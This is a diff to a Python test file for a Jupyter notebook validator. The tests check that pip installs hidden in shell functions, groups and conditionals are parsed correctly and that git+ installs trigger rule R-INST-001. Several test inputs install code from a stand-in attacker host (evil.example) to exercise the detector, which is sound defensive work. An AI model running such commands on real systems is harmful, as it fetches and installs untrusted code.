@@ -4198,12 +4198,15 @@ def test_a_shell_function_body_is_not_hidden_behind_its_name():
 
     cell = "!pip install safe; setup_audio() { pip install git+https://evil.example/x.git; }; setup_audio"
     assert [f.rule for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0)] == ["R-INST-001"]
-    # Conditional, so it never fabricates a version the notebook is claimed to install.
-    assert list(nv.unconditional_pip_invocations(cell))[0].packages == ["safe"]
+    # The function IS called here, so the body is replayed rather than merely seen.
+    assert [inv.packages for inv in nv.unconditional_pip_invocations(cell)] == [
+        ["safe"],
+        ["git+https://evil.example/x.git"],
+    ]
     for spelling in (
-        "!setup () { pip install a; }; setup",
-        "!function setup { pip install a; }; setup",
-        "!function setup () { pip install a; }; setup",
+        "!setup () { pip install a; }",
+        "!function setup { pip install a; }",
+        "!function setup () { pip install a; }",
     ):
         assert ("!pip install a", True) in nv._split_chained(spelling), spelling
     # Empty parens are required, so a grouped command and a substitution are untouched.
@@ -4497,3 +4500,82 @@ def test_an_allowlisted_repository_is_matched_whatever_the_suffix_case():
             "!pip install git+https://github.com/evil/repo.GIT", "nb.ipynb", 0
         )
     ] == ["R-INST-001"]
+
+
+def test_a_group_exits_with_its_list_status_not_its_last_word():
+    """`{ false && pip install x; } || pip install y` always runs the fallback.
+
+    Verified against bash. The group's status was read off the last LEXICAL command, so a
+    command the `&&` had short-circuited spoke for the group and the fallback read as
+    conditional.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert nv._split_chained(
+        "!{ false && pip install torchcodec==0.12; } || pip install torchcodec==0.11"
+    ) == [
+        ("!false", False),
+        ("!pip install torchcodec==0.12", True),
+        ("!pip install torchcodec==0.11", False),
+    ]
+    # A group that succeeds still skips its fallback.
+    assert nv._split_chained("!{ true && pip install a; } || pip install b") == [
+        ("!true", False),
+        ("!pip install a", False),
+        ("!pip install b", True),
+    ]
+
+
+def test_a_terminator_behind_a_body_keyword_still_ends_the_line():
+    """`if true; then exit; fi; pip install ...` reaches nothing after the `fi`.
+
+    Verified against bash. The check read the raw piece, which still began with `then`, so the
+    builtin behind it went unseen and a spurious R-INST-001 was reported.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert (
+        nv.rule_inst_001_git_plus(
+            "!if true; then exit; fi; pip install git+https://evil.example/x.git", "nb.ipynb", 0
+        )
+        == []
+    )
+    # A branch that MIGHT not be taken hands nothing over, and a subshell exit never does.
+    for cell in (
+        "!if maybe; then exit; fi; pip install git+https://evil.example/x.git",
+        "!if true; then (exit); fi; pip install git+https://evil.example/x.git",
+    ):
+        assert [f.rule for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0)] == [
+            "R-INST-001"
+        ], cell
+
+
+def test_a_called_function_body_is_replayed():
+    """`setup() { pip install ...; }; setup` definitely installs.
+
+    Leaving every body conditional was safe for the all-path rules but dropped the install
+    from the replay, so the whole-notebook gate skipped R-INST-003/004/005 on a pairing bash
+    performs.
+    """
+    nv = _load_notebook_validator_module()
+
+    called = "!setup() { pip install torch==2.11.0 torchcodec==0.10.0; }; setup"
+    assert [
+        (inv.action, inv.packages) for inv in nv.unconditional_pip_invocations(called)
+    ] == [("install", ["torch==2.11.0", "torchcodec==0.10.0"])]
+    assert [
+        f.rule for f in nv.rule_inst_004_torchcodec_torch(called, COLAB_TORCH211, "nb.ipynb", 0)
+    ] == ["R-INST-004"]
+    # Defined and never called, called only conditionally, or merely NAMED: still conditional.
+    for cell in (
+        "!setup() { pip install torch==2.11.0 torchcodec==0.10.0; }",
+        "!setup() { pip install torch==2.11.0 torchcodec==0.10.0; }; echo setup",
+        "!setup() { pip install torch==2.11.0 torchcodec==0.10.0; }; other",
+        "!setup() { pip install torch==2.11.0 torchcodec==0.10.0; }; maybe || setup",
+    ):
+        assert list(nv.unconditional_pip_invocations(cell)) == [], cell
+    # Arguments do not stop it being a call.
+    assert [
+        inv.packages
+        for inv in nv.unconditional_pip_invocations("!setup() { pip install a; }; setup --force")
+    ] == [["a"]]
